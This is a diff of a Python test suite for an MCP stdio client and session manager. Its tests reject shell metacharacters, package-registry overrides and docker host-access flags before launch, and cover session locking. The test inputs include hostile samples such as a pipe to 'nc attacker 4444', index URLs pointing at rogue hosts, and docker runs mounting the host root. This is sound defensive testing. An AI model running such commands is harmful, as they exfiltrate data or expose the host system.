@@ -12,6 +12,7 @@ import re
 import shutil
 import sys
 from contextlib import suppress
+from typing import get_type_hints
 from unittest.mock import AsyncMock, MagicMock, patch
 
 import httpx
@@ -55,6 +56,21 @@ def test_validate_mcp_stdio_env_allows_regular_env():
 _SHELL_INTERPRETERS = frozenset({"bash", "sh", "zsh", "cmd", "cmd.exe", "powershell", "powershell.exe", "/bin/sh"})
 
 
+def _stdio_client_with_mocked_session() -> tuple[MCPStdioClient, AsyncMock]:
+    """Return a real stdio client whose session creation cannot spawn a process."""
+    client = MCPStdioClient()
+    mock_session = MagicMock()
+    mock_session.list_tools = AsyncMock(return_value=MagicMock(tools=[]))
+    get_session = AsyncMock(return_value=mock_session)
+    client._get_or_create_session = get_session  # type: ignore[method-assign]
+    return client, get_session
+
+
+@pytest.fixture
+def stdio_client() -> MCPStdioClient:
+    return _stdio_client_with_mocked_session()[0]
+
+
 class TestMCPStdioShellFreeLaunch:
     """Tests for the shell=False stdio launcher.
 
@@ -68,11 +84,8 @@ class TestMCPStdioShellFreeLaunch:
     @staticmethod
     def _client_with_mocked_session():
         """Return a client whose session creation is stubbed so no process spawns."""
-        client = MCPStdioClient()
-        mock_session = MagicMock()
-        mock_session.list_tools = AsyncMock(return_value=MagicMock(tools=["sentinel-tool"]))
-        get_session = AsyncMock(return_value=mock_session)
-        client._get_or_create_session = get_session  # type: ignore[method-assign]
+        client, get_session = _stdio_client_with_mocked_session()
+        get_session.return_value.list_tools.return_value.tools = ["sentinel-tool"]
         return client, get_session
 
     async def test_benign_command_launches_without_shell(self):
@@ -123,26 +136,15 @@ class TestMCPStdioShellFreeLaunch:
             "node server.js | nc attacker 4444",  # pipe to listener
         ],
     )
-    async def test_shell_metacharacter_payloads_become_literal_argv(self, payload):
-        """Shell metacharacters are inert: with no shell, they are just literal argv tokens.
+    async def test_shell_metacharacter_payloads_are_rejected_before_spawn(self, payload):
+        """The shared API/runtime policy rejects shell syntax even with shell-free launch."""
+        client, get_session = self._client_with_mocked_session()
 
-        Under the old ``bash -c "exec ..."`` wrapper these payloads would chain a
-        second command. With shell=False the launched binary is the real
-        executable and the metacharacters are passed to it verbatim -- there is no
-        shell to interpret ``;``, ``&&``, ``|``, ``$()`` or backticks.
-        """
-        client, _ = self._client_with_mocked_session()
+        with pytest.raises(ValueError, match="dangerous shell metacharacter"):
+            await client._connect_to_server(payload)
 
-        await client._connect_to_server(payload)
-
-        params = client._connection_params
-        # The real binary is launched, never a shell.
-        assert params.command == "node"
-        assert params.command not in _SHELL_INTERPRETERS
-        # The dangerous tokens survive only as literal arguments handed to node,
-        # so they cannot spawn `touch`, `rm`, `nc`, or a substitution subshell.
-        joined = " ".join(params.args)
-        assert any(marker in joined for marker in (";", "&&", "|", "$(", "`"))
+        get_session.assert_not_awaited()
+        assert client._connection_params is None
 
     async def test_bash_func_env_is_rejected_before_any_spawn(self):
         """BASH_FUNC_* (Shellshock-style) env is both inert under shell=False and rejected.
@@ -192,6 +194,79 @@ class TestMCPStdioShellFreeLaunch:
 
         get_session.assert_not_awaited()
 
+    @pytest.mark.parametrize(
+        "dangerous_env",
+        [
+            {"NPM_CONFIG_REGISTRY": "https://packages.example.invalid"},
+            {"UV_DEFAULT_INDEX": "https://packages.example.invalid/simple"},
+            {"UV_INDEX_URL": "https://packages.example.invalid/simple"},
+            {"PIP_INDEX_URL": "https://packages.example.invalid/simple"},
+        ],
+    )
+    async def test_package_source_env_is_rejected_before_any_spawn(self, dangerous_env):
+        client, get_session = self._client_with_mocked_session()
+
+        with pytest.raises(ValueError, match="not allowed"):
+            await client._connect_to_server("uvx mcp-server", env=dangerous_env)
+
+        get_session.assert_not_awaited()
+
+    @pytest.mark.parametrize(
+        "command",
+        [
+            "uvx --default-index https://packages.example.invalid/simple mcp-server",
+            "uvx --from git+https://code.example.invalid/server.git mcp-server",
+            "npx --registry=https://packages.example.invalid @example/mcp-server",
+            "docker run -v /:/host mcp-server",
+            "docker run --mount type=bind,source=/,target=/host mcp-server",
+            "docker run --volumes-from other mcp-server",
+            "docker run --device=/dev/example mcp-server",
+            "docker run --network host mcp-server",
+            "docker run --security-opt seccomp=unconfined mcp-server",
+            "sh -c 'uvx --default-index https://packages.example.invalid/simple mcp-server'",
+        ],
+    )
+    async def test_source_args_and_docker_host_access_are_rejected_before_any_spawn(self, command):
+        client, get_session = self._client_with_mocked_session()
+
+        with pytest.raises(ValueError, match="not allowed"):
+            await client._connect_to_server(command)
+
+        get_session.assert_not_awaited()
+
+    async def test_trusted_uvx_from_and_provider_token_are_preserved(self):
+        client, get_session = self._client_with_mocked_session()
+
+        await client._connect_to_server(
+            "uvx --from lfx lfx-mcp",
+            env={"GITHUB_PERSONAL_ACCESS_TOKEN": "provider-token"},  # pragma: allowlist secret
+        )
+
+        get_session.assert_awaited_once()
+        assert client._connection_params.command == "uvx"
+        assert client._connection_params.args == ["--from", "lfx", "lfx-mcp"]
+        assert client._connection_params.env["GITHUB_PERSONAL_ACCESS_TOKEN"] == "provider-token"  # noqa: S105
+
+    async def test_isolated_docker_args_are_preserved(self):
+        client, get_session = self._client_with_mocked_session()
+
+        await client._connect_to_server(
+            "docker run --rm -i --network bridge --security-opt no-new-privileges mcp-image"
+        )
+
+        get_session.assert_awaited_once()
+        assert client._connection_params.command == "docker"
+        assert client._connection_params.args == [
+            "run",
+            "--rm",
+            "-i",
+            "--network",
+            "bridge",
+            "--security-opt",
+            "no-new-privileges",
+            "mcp-image",
+        ]
+
     async def test_empty_command_is_rejected(self):
         """An empty/whitespace command string raises rather than spawning an empty argv."""
         client, get_session = self._client_with_mocked_session()
@@ -226,10 +301,7 @@ class TestMCPSessionManager:
         mock_task = AsyncMock()
         mock_task.done = MagicMock(return_value=False)
 
-        with (
-            patch.object(session_manager, "_create_stdio_session") as mock_create,
-            patch.object(session_manager, "_validate_session_connectivity", return_value=True),
-        ):
+        with patch.object(session_manager, "_create_stdio_session") as mock_create:
             mock_create.return_value = (mock_session, mock_task)
 
             # First call should create session
@@ -281,10 +353,7 @@ class TestMCPSessionManager:
         server2_params = MagicMock()
         server2_params.command = "server2"
 
-        with (
-            patch.object(session_manager, "_create_stdio_session") as mock_create,
-            patch.object(session_manager, "_validate_session_connectivity", return_value=True),
-        ):
+        with patch.object(session_manager, "_create_stdio_session") as mock_create:
             mock_session1 = AsyncMock()
             mock_session2 = AsyncMock()
             mock_task1 = AsyncMock()
@@ -333,10 +402,7 @@ class TestMCPSessionManager:
             await release.wait()
             return mock_session, mock_task, "streamable_http", False
 
-        with (
-            patch.object(session_manager, "_create_streamable_http_session", side_effect=fake_create),
-            patch.object(session_manager, "_validate_session_connectivity", return_value=True),
-        ):
+        with patch.object(session_manager, "_create_streamable_http_session", side_effect=fake_create):
             getters = [
                 asyncio.create_task(session_manager.get_session(f"ctx_{i}", connection_params, "streamable_http"))
                 for i in range(10)
@@ -391,28 +457,34 @@ class TestMCPSessionManager:
 
         With `len(sessions)` as the id source, removing and re-adding sessions
         can produce colliding ids and silently overwrite a live session entry.
+
+        Sessions are forced to be dead (task.done() == True) so each
+        get_session() call cleans up the stale session and creates a new one,
+        advancing the monotonic counter.
         """
         connection_params = {"url": "http://example.test/sse", "headers": {}}
-
-        async def fake_create(_session_id, _params, _preferred_transport=None):
-            # Return a fresh session/task for each creation.
-            s = AsyncMock()
-            t = AsyncMock()
-            t.done = MagicMock(return_value=False)
-            t.cancel = MagicMock()
-            return s, t, "streamable_http", False
-
         server_key = session_manager._get_server_key(connection_params, "streamable_http")
 
-        with (
-            patch.object(session_manager, "_create_streamable_http_session", side_effect=fake_create),
-            # Force health check to fail so each call creates a fresh session.
-            patch.object(session_manager, "_validate_session_connectivity", return_value=False),
-        ):
-            ids_seen: list[str] = []
+        # Keep track of every task we hand out so we can mark them done before
+        # the next get_session() iteration.
+        created_tasks: list[MagicMock] = []
+
+        async def fake_create(_session_id, _params, _preferred_transport=None):
+            s = AsyncMock()
+            t = AsyncMock()
+            # Session starts alive; caller will flip to done between iterations.
+            t.done = MagicMock(return_value=False)
+            t.cancel = MagicMock()
+            created_tasks.append(t)
+            return s, t, "streamable_http", False
+
+        with patch.object(session_manager, "_create_streamable_http_session", side_effect=fake_create):
             for i in range(3):
+                # Mark all previously created tasks as dead so get_session()
+                # sees a stale session, cleans it up, and creates a fresh one.
+                for t in created_tasks:
+                    t.done = MagicMock(return_value=True)
                 await session_manager.get_session(f"ctx_{i}", connection_params, "streamable_http")
-                ids_seen.extend(session_manager.sessions_by_server[server_key]["sessions"].keys())
 
         # Counter keeps advancing even as old sessions are cleaned up.
         assert session_manager._session_id_counters[server_key] == 3
@@ -423,8 +495,12 @@ class TestMCPSessionManager:
         """Idle cleanup must not race a concurrent get_session().
 
         Without holding the per-server lock, the idle-cleanup task could pop
-        and cancel a session mid-validation; `get_session()` would then hand
+        and cancel a session mid-creation; `get_session()` would then hand
         the caller a dead session plus a dangling refcount entry.
+
+        The blocking point is inside ``_create_streamable_http_session`` (the
+        new session is being created while the getter holds the lock), which
+        means the idle-cleaner can only start after the getter releases it.
         """
         connection_params = {"url": "http://example.test/sse", "headers": {}}
         server_key = session_manager._get_server_key(connection_params, "streamable_http")
@@ -434,29 +510,24 @@ class TestMCPSessionManager:
         mock_task.done = MagicMock(return_value=False)
         mock_task.cancel = MagicMock()
 
-        # Seed one idle session (last_used in the distant past).
+        # Start with NO sessions so get_session() immediately enters
+        # _create_streamable_http_session (where we can block it).
         session_manager.sessions_by_server[server_key] = {
-            "sessions": {
-                f"{server_key}_0": {
-                    "session": mock_session,
-                    "task": mock_task,
-                    "type": "streamable_http",
-                    "last_used": 0,  # definitely past the idle timeout
-                }
-            },
+            "sessions": {},
             "last_cleanup": 0,
         }
 
         started = asyncio.Event()
         release = asyncio.Event()
 
-        async def slow_validate(_session):
+        async def slow_create(_session_id, _params, _preferred_transport=None):
+            # Signal that getter is inside the lock, then pause.
             started.set()
             await release.wait()
-            return True
+            return mock_session, mock_task, "streamable_http", False
 
-        with patch.object(session_manager, "_validate_session_connectivity", side_effect=slow_validate):
-            # Start a get_session() that will block inside the health check
+        with patch.object(session_manager, "_create_streamable_http_session", side_effect=slow_create):
+            # Start a get_session() that will block inside fake_create
             # while holding the per-server lock.
             getter = asyncio.create_task(
                 session_manager.get_session("ctx_reader", connection_params, "streamable_http")
@@ -466,32 +537,24 @@ class TestMCPSessionManager:
             # Fire the idle cleanup concurrently. It must wait for the lock.
             cleaner = asyncio.create_task(session_manager._cleanup_idle_sessions())
             # Deterministic rendezvous: wait until the cleaner has pinned the
-            # per-server lock (but is still blocked on the getter releasing
-            # it). Polling ``pins`` with scheduler-only yields replaces a
-            # timing-based ``asyncio.sleep(0.02)`` so the test does not rely
-            # on CI speed to expose a race. ``asyncio.Lock`` does not expose
-            # a waiters count, so internal-state polling is the deterministic
-            # primitive we have.
+            # per-server lock (but is still blocked on the getter releasing it).
             while session_manager._server_locks.get(server_key, {}).get("pins", 0) < 2:  # noqa: ASYNC110
                 await asyncio.sleep(0)
 
-            # While the getter still holds the lock, the session must not have
-            # been cleaned up.
-            assert f"{server_key}_0" in session_manager.sessions_by_server[server_key]["sessions"]
+            # While the getter still holds the lock, the session must not yet
+            # exist (it's being created), and cleanup must not have run.
             assert not mock_task.cancel.called
 
-            # Let the getter finish.
+            # Let the getter finish creating the session.
             release.set()
             result = await getter
             await cleaner
 
-        # Getter returned the healthy cached session. Because `get_session`
-        # bumps `last_used` on reuse, the idle-cleanup pass — which ran only
-        # after the getter released the lock — correctly left the session
-        # alone. Without the lock, the cleaner could have torn it down
-        # mid-validation and the getter would have returned a dead session.
+        # Getter returned the newly-created session.
         assert result is mock_session
         assert not mock_task.cancel.called
+        # Session is live (cleanup ran after getter and saw a just-created session
+        # with a fresh last_used, so it left it alone).
         assert f"{server_key}_0" in session_manager.sessions_by_server[server_key]["sessions"]
 
     async def test_concurrent_cleanup_session_and_get_session_safe(self, session_manager):
@@ -512,10 +575,7 @@ class TestMCPSessionManager:
         async def fake_create(_session_id, _params, _preferred_transport=None):
             return mock_session, mock_task, "streamable_http", False
 
-        with (
-            patch.object(session_manager, "_create_streamable_http_session", side_effect=fake_create),
-            patch.object(session_manager, "_validate_session_connectivity", return_value=True),
-        ):
+        with patch.object(session_manager, "_create_streamable_http_session", side_effect=fake_create):
             # Establish the session with one context.
             s1 = await session_manager.get_session("ctx_a", connection_params, "streamable_http")
             assert s1 is mock_session
@@ -564,10 +624,7 @@ class TestMCPSessionManager:
                 return mock_session_a, mock_task_a, "streamable_http", False
             return mock_session_b, mock_task_b, "streamable_http", False
 
-        with (
-            patch.object(session_manager, "_create_streamable_http_session", side_effect=fake_create),
-            patch.object(session_manager, "_validate_session_connectivity", return_value=True),
-        ):
+        with patch.object(session_manager, "_create_streamable_http_session", side_effect=fake_create):
             # Establish context on server A.
             s_a = await session_manager.get_session("ctx_move", server_a_params, "streamable_http")
             assert s_a is mock_session_a
@@ -623,10 +680,7 @@ class TestMCPSessionManager:
         async def fake_create(_session_id, _params, _preferred_transport=None):
             return mock_session, mock_task, "streamable_http", False
 
-        with (
-            patch.object(session_manager, "_create_streamable_http_session", side_effect=fake_create),
-            patch.object(session_manager, "_validate_session_connectivity", return_value=True),
-        ):
+        with patch.object(session_manager, "_create_streamable_http_session", side_effect=fake_create):
             await session_manager.get_session("ctx_gc", connection_params, "streamable_http")
 
         # While the session is live, the lock entry exists (pin count back to 0
@@ -910,12 +964,8 @@ class TestUpdateToolsStdioHeaders:
     """Test that update_tools injects component headers into stdio args."""
 
     @pytest.mark.asyncio
-    async def test_stdio_headers_injected_with_existing_headers_flag(self):
+    async def test_stdio_headers_injected_with_existing_headers_flag(self, stdio_client):
         """Headers should be injected as --headers key value before the existing --headers flag."""
-        mock_stdio = AsyncMock(spec=MCPStdioClient)
-        mock_stdio.connect_to_server.return_value = []
-        mock_stdio._connected = True
-
         server_config = {
             "command": "uvx",
             "args": [
@@ -930,23 +980,25 @@ class TestUpdateToolsStdioHeaders:
             "headers": {"Authorization": "Bearer token123"},
         }
 
-        await update_tools("test-server", server_config, mcp_stdio_client=mock_stdio)
+        await update_tools("test-server", server_config, mcp_stdio_client=stdio_client)
 
-        mock_stdio.connect_to_server.assert_called_once()
-        full_command = mock_stdio.connect_to_server.call_args[0][0]
-
-        # The injected --headers should appear before the existing --headers
-        assert "--headers authorization 'Bearer token123' --headers x-api-key sk-existing" in full_command
-        # URL should still be at the end
-        assert full_command.endswith("http://localhost:7860/api/v1/mcp/project/test/streamable")
+        assert stdio_client._connection_params.command == "uvx"
+        assert stdio_client._connection_params.args == [
+            "mcp-proxy",
+            "--transport",
+            "streamablehttp",
+            "--headers",
+            "authorization",
+            "Bearer token123",
+            "--headers",
+            "x-api-key",
+            "sk-existing",
+            "http://localhost:7860/api/v1/mcp/project/test/streamable",
+        ]
 
     @pytest.mark.asyncio
-    async def test_stdio_headers_injected_without_existing_headers_flag(self):
+    async def test_stdio_headers_injected_without_existing_headers_flag(self, stdio_client):
         """When no --headers flag exists, headers should be inserted before the last positional arg."""
-        mock_stdio = AsyncMock(spec=MCPStdioClient)
-        mock_stdio.connect_to_server.return_value = []
-        mock_stdio._connected = True
-
         server_config = {
             "command": "uvx",
             "args": [
@@ -958,20 +1010,21 @@ class TestUpdateToolsStdioHeaders:
             "headers": {"X-Api-Key": "my-key"},
         }
 
-        await update_tools("test-server", server_config, mcp_stdio_client=mock_stdio)
+        await update_tools("test-server", server_config, mcp_stdio_client=stdio_client)
 
-        full_command = mock_stdio.connect_to_server.call_args[0][0]
-
-        # --headers should be inserted before the URL
-        assert "--headers x-api-key my-key http://localhost:7860/streamable" in full_command
+        assert stdio_client._connection_params.args == [
+            "mcp-proxy",
+            "--transport",
+            "streamablehttp",
+            "--headers",
+            "x-api-key",
+            "my-key",
+            "http://localhost:7860/streamable",
+        ]
 
     @pytest.mark.asyncio
-    async def test_stdio_multiple_headers_each_get_own_flag(self):
+    async def test_stdio_multiple_headers_each_get_own_flag(self, stdio_client):
         """Each header should get its own --headers key value triplet."""
-        mock_stdio = AsyncMock(spec=MCPStdioClient)
-        mock_stdio.connect_to_server.return_value = []
-        mock_stdio._connected = True
-
         server_config = {
             "command": "uvx",
             "args": [
@@ -986,155 +1039,163 @@ class TestUpdateToolsStdioHeaders:
             "headers": {"X-Custom-One": "val1", "X-Custom-Two": "val2"},
         }
 
-        await update_tools("test-server", server_config, mcp_stdio_client=mock_stdio)
+        await update_tools("test-server", server_config, mcp_stdio_client=stdio_client)
 
-        full_command = mock_stdio.connect_to_server.call_args[0][0]
-
-        # Each header gets its own --headers flag
-        assert "--headers x-custom-one val1" in full_command
-        assert "--headers x-custom-two val2" in full_command
-        # Original header still present
-        assert "--headers x-api-key sk-existing" in full_command
+        assert stdio_client._connection_params.args == [
+            "mcp-proxy",
+            "--transport",
+            "streamablehttp",
+            "--headers",
+            "x-custom-one",
+            "val1",
+            "--headers",
+            "x-custom-two",
+            "val2",
+            "--headers",
+            "x-api-key",
+            "sk-existing",
+            "http://localhost/streamable",
+        ]
 
     @pytest.mark.asyncio
-    async def test_stdio_no_headers_leaves_args_unchanged(self):
+    async def test_stdio_no_headers_leaves_args_unchanged(self, stdio_client):
         """When no component headers are set, args should not be modified."""
-        mock_stdio = AsyncMock(spec=MCPStdioClient)
-        mock_stdio.connect_to_server.return_value = []
-        mock_stdio._connected = True
-
         server_config = {
             "command": "uvx",
             "args": ["mcp-proxy", "--transport", "streamablehttp", "http://localhost/streamable"],
         }
 
-        await update_tools("test-server", server_config, mcp_stdio_client=mock_stdio)
+        await update_tools("test-server", server_config, mcp_stdio_client=stdio_client)
 
-        full_command = mock_stdio.connect_to_server.call_args[0][0]
-        assert full_command == "uvx mcp-proxy --transport streamablehttp http://localhost/streamable"
+        assert stdio_client._connection_params.args == [
+            "mcp-proxy",
+            "--transport",
+            "streamablehttp",
+            "http://localhost/streamable",
+        ]
 
     @pytest.mark.asyncio
-    async def test_stdio_multiword_command_with_empty_args(self):
-        """A multi-word command string (e.g. 'uvx mcp-server-fetch') with empty args should be split correctly.
-
-        Regression test: shlex.join(["uvx mcp-server-fetch"]) used to produce
-        a single-quoted token that bash treated as one binary name, causing
-        'exec: uvx mcp-server-fetch: not found'.
-        """
-        mock_stdio = AsyncMock(spec=MCPStdioClient)
-        mock_stdio.connect_to_server.return_value = []
-        mock_stdio._connected = True
-
+    @pytest.mark.parametrize(
+        "command",
+        [
+            "uvx mcp-server-fetch",
+            "node -e",
+            "npx\t-y\t@modelcontextprotocol/server-fetch",
+            "/usr/bin/node --version",
+            "C:\\Program Files\\nodejs\\node.exe --version",
+        ],
+    )
+    async def test_stdio_rejects_arguments_embedded_in_command(self, command, stdio_client):
+        """Runtime-loaded configs enforce the same single-executable command boundary."""
         server_config = {
-            "command": "uvx mcp-server-fetch",
+            "command": command,
             "args": [],
         }
 
-        await update_tools("test-server", server_config, mcp_stdio_client=mock_stdio)
+        with pytest.raises(ValueError, match="single executable"):
+            await update_tools("test-server", server_config, mcp_stdio_client=stdio_client)
 
-        full_command = mock_stdio.connect_to_server.call_args[0][0]
-        assert full_command == "uvx mcp-server-fetch"
+        assert stdio_client._connection_params is None
 
     @pytest.mark.asyncio
-    async def test_stdio_multiword_command_with_args(self):
-        """A multi-word command string combined with additional args should produce correct tokens."""
-        mock_stdio = AsyncMock(spec=MCPStdioClient)
-        mock_stdio.connect_to_server.return_value = []
-        mock_stdio._connected = True
+    async def test_stdio_preserves_executable_path_with_spaces(self, stdio_client):
+        """A platform path stays one argv entry while args remain separate."""
+        command = "C:\\Program Files\\nodejs\\node.exe"
 
         server_config = {
-            "command": "uvx mcp-server-fetch",
-            "args": ["--timeout", "30"],
+            "command": command,
+            "args": ["server.js", "--timeout", "30"],
         }
 
-        await update_tools("test-server", server_config, mcp_stdio_client=mock_stdio)
+        await update_tools("test-server", server_config, mcp_stdio_client=stdio_client)
 
-        full_command = mock_stdio.connect_to_server.call_args[0][0]
-        assert full_command == "uvx mcp-server-fetch --timeout 30"
+        assert stdio_client._connection_params.command == command
+        assert stdio_client._connection_params.args == ["server.js", "--timeout", "30"]
 
     @pytest.mark.asyncio
-    async def test_stdio_headers_appended_when_all_args_are_flags(self):
+    async def test_stdio_headers_appended_when_all_args_are_flags(self, stdio_client):
         """When all args are flags (no positional URL), headers should be appended."""
-        mock_stdio = AsyncMock(spec=MCPStdioClient)
-        mock_stdio.connect_to_server.return_value = []
-        mock_stdio._connected = True
-
         server_config = {
-            "command": "some-tool",
-            "args": ["--verbose", "--debug"],
+            "command": "uvx",
+            "args": ["--verbose", "--isolated"],
             "headers": {"Authorization": "Bearer tok"},
         }
 
-        await update_tools("test-server", server_config, mcp_stdio_client=mock_stdio)
+        await update_tools("test-server", server_config, mcp_stdio_client=stdio_client)
 
-        full_command = mock_stdio.connect_to_server.call_args[0][0]
-        assert full_command == "some-tool --verbose --debug --headers authorization 'Bearer tok'"
+        assert stdio_client._connection_params.args == [
+            "--verbose",
+            "--isolated",
+            "--headers",
+            "authorization",
+            "Bearer tok",
+        ]
 
     @pytest.mark.asyncio
-    async def test_stdio_headers_appended_when_last_token_is_flag_value(self):
+    async def test_stdio_headers_appended_when_last_token_is_flag_value(self, stdio_client):
         """When the last token is a flag's value, headers should be appended, not inserted before it."""
-        mock_stdio = AsyncMock(spec=MCPStdioClient)
-        mock_stdio.connect_to_server.return_value = []
-        mock_stdio._connected = True
-
         server_config = {
-            "command": "some-tool",
-            "args": ["--port", "8080"],
+            "command": "uvx",
+            "args": ["--color", "always"],
             "headers": {"Authorization": "Bearer tok"},
         }
 
-        await update_tools("test-server", server_config, mcp_stdio_client=mock_stdio)
+        await update_tools("test-server", server_config, mcp_stdio_client=stdio_client)
 
-        full_command = mock_stdio.connect_to_server.call_args[0][0]
-        # 8080 is a value for --port, not a positional arg, so headers go at the end
-        assert full_command == "some-tool --port 8080 --headers authorization 'Bearer tok'"
+        assert stdio_client._connection_params.args == [
+            "--color",
+            "always",
+            "--headers",
+            "authorization",
+            "Bearer tok",
+        ]
 
     @pytest.mark.asyncio
-    async def test_stdio_headers_inserted_before_positional_with_flag_value_pairs(self):
+    async def test_stdio_headers_inserted_before_positional_with_flag_value_pairs(self, stdio_client):
         """Headers should be inserted before the last positional arg even when flag+value pairs precede it."""
-        mock_stdio = AsyncMock(spec=MCPStdioClient)
-        mock_stdio.connect_to_server.return_value = []
-        mock_stdio._connected = True
-
         server_config = {
             "command": "uvx",
             "args": ["mcp-proxy", "--port", "8080", "http://localhost/streamable"],
             "headers": {"X-Api-Key": "my-key"},
         }
 
-        await update_tools("test-server", server_config, mcp_stdio_client=mock_stdio)
+        await update_tools("test-server", server_config, mcp_stdio_client=stdio_client)
 
-        full_command = mock_stdio.connect_to_server.call_args[0][0]
-        # --port 8080 is a flag pair; http://localhost/streamable is the positional arg
-        assert full_command == "uvx mcp-proxy --port 8080 --headers x-api-key my-key http://localhost/streamable"
+        assert stdio_client._connection_params.args == [
+            "mcp-proxy",
+            "--port",
+            "8080",
+            "--headers",
+            "x-api-key",
+            "my-key",
+            "http://localhost/streamable",
+        ]
 
     @pytest.mark.asyncio
-    async def test_stdio_headers_inserted_before_last_positional_with_multiple_positionals(self):
+    async def test_stdio_headers_inserted_before_last_positional_with_multiple_positionals(self, stdio_client):
         """When multiple positional args exist, headers are inserted before the last one."""
-        mock_stdio = AsyncMock(spec=MCPStdioClient)
-        mock_stdio.connect_to_server.return_value = []
-        mock_stdio._connected = True
-
         server_config = {
             "command": "uvx",
             "args": ["mcp-proxy", "--transport", "streamablehttp", "extra-pos-arg", "http://localhost/streamable"],
             "headers": {"X-Key": "val"},
         }
 
-        await update_tools("test-server", server_config, mcp_stdio_client=mock_stdio)
+        await update_tools("test-server", server_config, mcp_stdio_client=stdio_client)
 
-        full_command = mock_stdio.connect_to_server.call_args[0][0]
-        # Should insert before the last positional (the URL), not before "extra-pos-arg"
-        assert "--headers x-key val http://localhost/streamable" in full_command
-        assert "extra-pos-arg --headers" in full_command
+        assert stdio_client._connection_params.args == [
+            "mcp-proxy",
+            "--transport",
+            "streamablehttp",
+            "extra-pos-arg",
+            "--headers",
+            "x-key",
+            "val",
+            "http://localhost/streamable",
+        ]
 
     @pytest.mark.asyncio
-    async def test_stdio_does_not_mutate_original_config(self):
+    async def test_stdio_does_not_mutate_original_config(self, stdio_client):
         """The original server_config args list should not be mutated."""
-        mock_stdio = AsyncMock(spec=MCPStdioClient)
-        mock_stdio.connect_to_server.return_value = []
-        mock_stdio._connected = True
-
         original_args = ["mcp-proxy", "--headers", "x-api-key", "sk-orig", "http://localhost/s"]
         server_config = {
             "command": "uvx",
@@ -1142,7 +1203,7 @@ class TestUpdateToolsStdioHeaders:
             "headers": {"X-Extra": "val"},
         }
 
-        await update_tools("test-server", server_config, mcp_stdio_client=mock_stdio)
+        await update_tools("test-server", server_config, mcp_stdio_client=stdio_client)
 
         # Original list should be unchanged
         assert original_args == ["mcp-proxy", "--headers", "x-api-key", "sk-orig", "http://localhost/s"]
@@ -1194,7 +1255,7 @@ class TestUpdateToolsPerToolResilience:
         ):
             mode, tool_list, tool_cache = await update_tools(
                 server_name="linear-like",
-                server_config={"command": "fake-cmd", "args": []},
+                server_config={"command": "uvx", "args": []},
                 mcp_stdio_client=mock_stdio,
             )
 
@@ -1244,7 +1305,7 @@ class TestUpdateToolsPerToolResilience:
         with patch("lfx.base.mcp.util.create_input_schema_from_json_schema", side_effect=selective_converter):
             _, tool_list, tool_cache = await update_tools(
                 server_name="stress",
-                server_config={"command": "fake-cmd", "args": []},
+                server_config={"command": "uvx", "args": []},
                 mcp_stdio_client=mock_stdio,
             )
 
@@ -3725,6 +3786,26 @@ class TestConvertMcpResult:
         json.loads(converted[0]["text"])
 
 
+def test_mcp_structured_tool_annotations_resolve_in_util_namespace():
+    """Keep LangChain's inherited forward annotations resolvable for Pydantic."""
+    from langchain_core.tools import StructuredTool
+
+    annotation_proxy = type(
+        "MCPStructuredToolAnnotations",
+        (),
+        {"__annotations__": StructuredTool.__annotations__},
+    )
+
+    resolved = get_type_hints(
+        annotation_proxy,
+        globalns=vars(util),
+        localns=vars(util),
+        include_extras=True,
+    )
+
+    assert set(StructuredTool.__annotations__) <= set(resolved)
+
+
 class TestMCPStructuredToolToolCallId:
     """Tests for the tool_call_id branching inside MCPStructuredTool.
 
@@ -3752,6 +3833,7 @@ class TestMCPStructuredToolToolCallId:
             content.append(img_block)
 
         result = MagicMock()
+        result.isError = False
         result.content = content
         result.structuredContent = None
         return result
@@ -3769,7 +3851,7 @@ class TestMCPStructuredToolToolCallId:
         mock_client.run_tool = AsyncMock(return_value=raw_result)
         mock_client._connected = True
 
-        server_config = {"command": "fake-server"}
+        server_config = {"command": "uvx"}
         _, tools, _ = await update_tools("test-server", server_config, mcp_stdio_client=mock_client)
         assert tools, "update_tools() must return at least one tool"
         return tools[0]
@@ -3996,3 +4078,243 @@ class TestStreamableHttpTransportPolicy:
         e = httpx.HTTPStatusError("x", request=req, response=resp_404)
         assert _should_attempt_sse_after_streamable_failure(e) is True
         assert _should_attempt_sse_after_streamable_failure(ConnectionError("x")) is False
+
+
+# ---------------------------------------------------------------------------
+# Regression tests for the CPU-spin / workflow-hang fix
+# ---------------------------------------------------------------------------
+
+
+class TestCleanupIntervalFloorGuard:
+    """get_session_cleanup_interval() must never return a value below the minimum.
+
+    If the cleanup loop sleeps(0) it spins at 100% CPU and locks the machine.
+    """
+
+    def _get_interval(self):
+        from lfx.base.mcp.util import get_session_cleanup_interval
+
+        return get_session_cleanup_interval
+
+    def test_returns_configured_value_when_above_minimum(self):
+        get_session_cleanup_interval = self._get_interval()
+        with patch.object(util, "_get_mcp_setting", return_value=120):
+            assert get_session_cleanup_interval() == 120
+
+    def test_clamps_zero_to_minimum(self):
+        get_session_cleanup_interval = self._get_interval()
+        with patch.object(util, "_get_mcp_setting", return_value=0):
+            result = get_session_cleanup_interval()
+            assert result >= 30
+
+    def test_clamps_none_to_minimum(self):
+        get_session_cleanup_interval = self._get_interval()
+        with patch.object(util, "_get_mcp_setting", return_value=None):
+            result = get_session_cleanup_interval()
+            assert result >= 30
+
+    def test_clamps_negative_to_minimum(self):
+        get_session_cleanup_interval = self._get_interval()
+        with patch.object(util, "_get_mcp_setting", return_value=-1):
+            result = get_session_cleanup_interval()
+            assert result >= 30
+
+    def test_clamps_value_below_minimum_to_minimum(self):
+        get_session_cleanup_interval = self._get_interval()
+        with patch.object(util, "_get_mcp_setting", return_value=5):
+            result = get_session_cleanup_interval()
+            assert result >= 30
+
+
+class TestCleanupTaskStartup:
+    """The cleanup task must tolerate sync construction and start on first async use."""
+
+    def test_constructor_without_running_loop_defers_cleanup_task(self):
+        manager = MCPSessionManager()
+
+        assert manager._cleanup_task is None
+
+    async def test_get_session_starts_deferred_cleanup_task(self):
+        manager = MCPSessionManager()
+        await manager.cleanup_all()
+        manager._cleanup_task = None
+        connection_params = {"url": "http://example.test/sse", "headers": {}}
+        mock_session = AsyncMock()
+        mock_task = MagicMock()
+        mock_task.done.return_value = False
+
+        async def fake_create(_session_id, _params, _preferred_transport=None):
+            return mock_session, mock_task, "streamable_http", False
+
+        try:
+            with patch.object(manager, "_create_streamable_http_session", side_effect=fake_create):
+                await manager.get_session("ctx_1", connection_params, "streamable_http")
+
+            assert manager._cleanup_task is not None
+            assert not manager._cleanup_task.done()
+        finally:
+            await manager.cleanup_all()
+
+
+class TestGetSessionNoBlockingHealthCheck:
+    """get_session() must NOT call list_tools() on the hot path.
+
+    Before the fix, every get_session() called _validate_session_connectivity()
+    which did a list_tools() RPC (~3 s timeout). With 10 sessions that added
+    ~30 s of blocking to every single tool invocation.
+    """
+
